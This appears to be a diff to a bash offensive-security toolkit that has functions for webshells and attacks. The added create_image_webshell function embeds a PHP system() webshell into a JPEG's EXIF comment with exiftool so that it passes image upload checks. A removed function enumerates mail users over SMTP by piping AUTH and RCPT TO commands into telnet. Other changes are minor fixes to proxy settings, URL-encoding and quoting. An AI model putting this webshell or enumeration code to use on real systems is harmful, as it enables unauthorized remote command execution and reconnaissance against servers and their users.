@@ -46,6 +46,7 @@ extract_hidden_input() {
     echo "$form_content" | grep -oE '<input[^>]*type="hidden"[^>]*>' | while read -r input; do
         name=$(echo "$input" | sed -n 's/.*name="\([^"]*\)".*/\1/p')
         value=$(echo "$input" | sed -n 's/.*value="\([^"]*\)".*/\1/p')
+        value=$(urlencode "$value")
         if [[ -n "$name" ]]; then
             echo "${name}=${value}"
         fi
@@ -70,7 +71,7 @@ get_hidden_inputs() {
             echo "Proxy target or port is not set." >> $trail_log 
             return 1
         fi
-        proxy_option="-x socks5://$proxy_target:$proxy_port"
+        proxy_option="-x $proxy_type://$proxy_target:$proxy_port"
         echo "Using $proxy_option" >> $trail_log
     fi
     #echo curl -c $cookie_jar -s "$url" $proxy_option 
@@ -193,6 +194,18 @@ create_jsp_webshell() {
     fi
 }
 
+create_image_webshell() {
+    cp $SCRIPTDIR/../images/blank.jpg .
+    local command=""
+    if [[ -z "$cmd" ]]; then
+        command="\$_GET[\"cmd\"]"
+    else
+        command="'$cmd'"
+    fi
+    exiftool -Comment="<?php system($command); ?>" blank.jpg
+    file blank.jpg
+}
+
 create_nodejs_webshell() {
     cp $SCRIPTDIR/../js/node.js .
     if [[ -z "$cmd" ]]; then
@@ -217,54 +230,6 @@ run_curl() {
     else
         curl -s "$url" --proxy "socks5://$proxy_target:$proxy_port"
     fi
-}
-
-enumerate_smtp_auth() {
-    if [[ -z $target_ip ]]; then
-        echo "Target IP is not set."
-        return 1
-    fi
-    if [[ -z $smtp_client_host ]]; then
-        echo "SMTP client host is not set."
-        return 1
-    fi
-    if [[ -z $smtp_username ]]; then
-        echo "SMTP username is not set."
-        return 1
-    fi
-    if [[ -z $smtp_password ]]; then
-        echo "SMTP password is not set."
-        return 1
-    fi
-    if [[ -z $target_users ]]; then
-        target_users=users.txt
-        if [[ ! -f $target_users ]]; then
-            echo "Target users file $target_users does not exist."
-            return 1
-        fi
-    fi
-    # Enumerate SMTP services
-    sleep_time=0.05
-    echo "Enumerating SMTP services on $target_ip..."
-    {
-        ( 
-        echo "HELO $smtp_client_host" 
-        sleep $sleep_time
-        echo 'AUTH LOGIN'
-        sleep $sleep_time
-        echo -n "$smtp_username" | base64 
-        sleep $sleep_time
-        echo -n "$smtp_password" | base64 
-        sleep $sleep_time
-        echo "MAIL FROM:$smtp_username"
-        sleep $sleep_time
-        while IFS= read -r target_user; do
-            echo "RCPT TO:$target_user"
-            sleep $sleep_time
-        done < $target_users
-        echo 'QUIT'
-        ) | tee >(cat >&2) | telnet $target_ip 25
-    } >> smtp.log 2>&1
 }
 
 perform_phpmyadmin_attack() {
@@ -313,7 +278,7 @@ download_web_folder() {
     if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == true ]]; then
         proxy_option="proxychains -q "
     fi
-    ${proxy_option}wget -r -nH -R 'index.html*' --no-parent $target_url
+    ${proxy_option}wget -r -nH -R 'index.html*' --no-parent "$target_url"
     popd || return 1
 }
 
